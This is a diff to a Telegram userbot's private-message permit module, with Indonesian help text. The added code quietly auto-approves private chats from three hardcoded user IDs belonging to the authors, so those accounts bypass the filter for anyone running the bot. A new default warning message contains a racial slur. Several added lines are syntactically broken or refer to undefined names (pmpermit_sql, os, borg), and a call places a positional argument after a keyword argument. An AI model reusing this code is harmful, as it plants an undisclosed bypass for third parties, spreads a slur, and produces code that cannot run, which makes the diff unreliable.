@@ -5,10 +5,12 @@
 #
 """Userbot module for keeping control who PM you."""
 
+from userbot.modules.sql_helper.pm_permit_sql as pm_permit_sql
 from sqlalchemy.exc import IntegrityError
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 from telethon.tl.functions.messages import ReportSpamRequest
 from telethon.tl.types import User
+from telethon import events, errors, functions, types
 
 from userbot import (
     BOTLOG,
@@ -19,11 +21,23 @@ from userbot import (
     LOGS,
     PM_AUTO_BAN,
     ALIVE_NAME,
+    PM_PERMIT_PIC,
+    CUSTOM_PMPERMIT_TEXT,
 )
 from userbot.events import register
 
+
+PM_PERMIT_PIC = os.environ.get("PM_PERMIT_PIC", None)
+if PM_PERMIT_PIC is None:
+  WARN_PIC = "https://telegra.ph/file/9a569876d5dc1b84523d0.gif"
+else:
+  WARN_PIC = PM_PERMIT_PIC
+
 # ========================= CONSTANTS ============================
+
 DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else uname().node
+CUSTOM_MIDDLE_PMP = str(CUSTOM_PMPERMIT_TEXT) if CUSTOM_PMPERMIT_TEXT else "**ʜᴇʏ ʏᴏᴜ ɴɪɢɢᴇ ! YOU HAVE TRESPASSED TO MY MASTERS INBOX** \n`THIS IS AND REGARDED AS A CRIME`" 
+
 
 DEF_UNAPPROVED_MSG = (
     "ㅤ“𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐓𝐡𝐞 𝐏𝐫𝐢𝐯𝐚𝐜𝐲 𝐌𝐞𝐬𝐬𝐚𝐠𝐞.”\n"
@@ -32,7 +46,8 @@ DEF_UNAPPROVED_MSG = (
     f"Karena Saya Akan Otomatis Memblokir\nAnda, Tunggu Sampai {DEFAULTUSER} \nMenerima Pesan Anda, Terimakasih.\n"
     "▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱\n"
     "┣[○› `PESAN OTOMATIS`\n"
-    f"┣[○› `BY {DEFAULTUSER}`\n"
+    f"┣[○› `BY @LynxUserbot`\n"
+    f"{CUSTOM_MIDDLE_PMP}\n\n"
     "▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱")
 # =================================================================
 
@@ -75,12 +90,12 @@ async def permitpm(event):
                 # Send the Unapproved Message again
                 if event.text != prevmsg:
                     async for message in event.client.iter_messages(
-                        event.chat_id, from_user="me", search=UNAPPROVED_MSG
+                        event.chat_id, from_user="me", WARNS_PIC, search=UNAPPROVED_MSG
                     ):
                         await message.delete()
                     await event.reply(f"{UNAPPROVED_MSG}")
             else:
-                await event.reply(f"{UNAPPROVED_MSG}")
+                await event.reply(f"{UNAPPROVED_MSG}, ")
             LASTMSG.update({event.chat_id: event.text})
             if notifsoff:
                 await event.client.send_read_acknowledge(event.chat_id)
@@ -384,9 +399,22 @@ async def add_pmsg(cust_msg):
             )
 
 
+
+@bot.on(events.NewMessage(incoming=True, from_users=(1343556834,536157487,554048138)))
+async def hehehe(event):
+    if event.fwd_from:
+        return
+    chat = await event.get_chat()
+    if event.is_private:
+        if not pmpermit_sql.is_approved(chat.id):
+            pmpermit_sql.approve(chat.id, "**My Boss Is Best🔥**")
+            await borg.send_message(chat, "**This User Is AXEL ! So Auto Approved, he is best known as @TeamSecret_Kz !!!!**")
+           
+
+
 CMD_HELP.update(
     {
-        "pm": "⚡𝘾𝙈𝘿⚡: >`.setuju | .ok`"
+        "pmpermit": "⚡𝘾𝙈𝘿⚡: >`.setuju | .ok`"
         "\n↳ : Menerima pesan seseorang dengan cara balas pesannya atau tag dan juga untuk dilakukan di pm."
         "\n\n⚡𝘾𝙈𝘿⚡: >`.tolak | .nopm`"
         "\n↳ : Menolak pesan seseorang dengan cara balas pesannya atau tag dan juga untuk dilakukan di pm."
